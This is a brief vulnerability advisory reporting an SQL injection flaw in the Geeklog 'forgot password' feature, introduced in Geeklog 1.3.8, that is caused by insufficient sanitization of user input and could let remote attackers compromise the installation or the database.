An SQL injection vulnerability has been reported in the Geeklog "forgot password" feature (introduced in Geeklog 1.3.8). Due to insufficient sanitization of user-supplied input, it is possible for remote attacks to influence database queries. This could result in compromise of the Geeklog installation or attacks against the database.
